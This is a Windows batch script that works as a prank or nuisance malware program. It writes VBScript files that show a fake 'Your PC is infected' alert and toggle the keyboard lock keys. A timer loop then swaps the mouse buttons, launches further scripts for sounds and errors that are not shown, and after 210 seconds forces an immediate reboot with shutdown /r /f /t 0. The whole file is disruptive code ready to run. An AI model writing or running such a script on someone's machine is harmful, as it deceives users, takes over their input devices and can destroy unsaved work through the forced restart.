@echo off
cls
Set S=0
IF EXIST %TEMP%\Dance.VBS (del /F %Temp%\Dance.vbs)
echo x=msgbox("Your PC is infected" ,16, "Infected") >> %temp%\temp.vbs
echo Set wshShell =wscript.CreateObject("WScript.Shell") >> %temp%\Dance.vbs
echo wscript.sleep 50 >> %temp%\Dance.vbs
echo wshshell.sendkeys "{CAPSLOCK}" >> %temp%\Dance.vbs
echo wscript.sleep 50 >> %temp%\Dance.vbs
echo wshshell.sendkeys "{NUMLOCK}" >> %temp%\Dance.vbs
echo wscript.sleep 50 >> %temp%\Dance.vbs
echo wshshell.sendkeys "{SCROLLLOCK}" >> %temp%\Dance.vbs
:S
timeout /T 1 /NOBREAK > nul
set /a S=%S%+1
cls
echo It has been %S% second(s)
echo ">30 = Mouse reverse"
echo ">60 = V O I D S P E E C H"
echo ">90 = KeyDance"
echo ">120 = Sound randomize"
echo ">150 = Errors"
echo ">210 = Shutdown"
if %S% GEQ 30 (mouse.exe /PrimaryButton:Right>nul)
if %S% GEQ 60 (wscript.exe .\1.vbs .\SAM.bat)
if %S% GEQ 90 (wscript.exe .\1.vbs .\Dance.bat)
if %S% GEQ 120 (wscript.exe .\1.vbs .\Sound.bat)
if %S% GEQ 150 (wscript.exe .\1.vbs .\Error.bat)
if %S% GEQ 210 (shutdown /r /f /t 0 /d U:6:12)
goto :S